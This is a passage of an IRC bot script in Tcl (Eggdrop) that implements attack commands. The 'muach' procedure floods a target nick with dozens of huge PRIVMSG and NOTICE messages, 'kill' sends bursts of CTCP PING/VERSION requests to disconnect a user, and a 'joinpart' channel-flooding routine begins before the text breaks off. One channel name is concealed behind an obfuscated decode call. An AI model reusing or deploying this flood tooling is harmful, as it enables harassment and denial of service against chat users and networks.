puthelp "PRIVMSG $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
putlog "$notc !$hand! Flood muach $person"
return 0
}
if {$rest==""} {
puthelp "NOTICE $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
putlog "$notc !$hand! Flood muach $person"
return 0
}
}
## public cmd flood muach -- stop
## public cmd flood kill -- start
proc msg_kill {nick uhost hand rest} {
pub_kill $nick $uhost $hand "*" $rest
}
proc pub_kill {nick uhost hand channel rest} {
global notc owner ps
set person [lindex $rest 0]
set rest [lrange $rest 1 end]
if {[string tolower $person]==[string tolower $ps] || [string tolower $person]==[string tolower $owner]} {
return 0
}
if {$rest==""} {
putserv "PRIVMSG $person :\001PING [unixtime]\001"
putserv "PRIVMSG $person :\001VERSION [unixtime]\001"
putserv "PRIVMSG $person :\001PING [unixtime]\001"
putserv "PRIVMSG $person :\001VERSION [unixtime]\001"
putserv "PRIVMSG $person :\001PING [unixtime]\001"
putserv "PRIVMSG $person :\001VERSION [unixtime]\001"
putlog "!$hand! CTCP flooding"
return 0
}
if {$rest!=""} {
puthelp "NOTICE $nick :$notc Usage: kill <nick>"
return 0
}
}
## public cmd flood kill -- end
## public cmd flood joinpart -- start
proc msg_joinpart {nick uhost hand rest} {
pub_joinpart $nick $uhost $hand "*" $rest
}
proc pub_joinpart {nick uhost hand channel rest} {
global notc basechan
set chan [lindex $rest 0]
set rest [lrange $rest 1 end]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
if {[string tolower $chan]==[string tolower $basechan] || [string tolower $chan] == [dezip [lines "9MJu6/A2i8/0"]]} {
return 0
}
if {$rest!=""} {
puthelp "JOIN $chan"
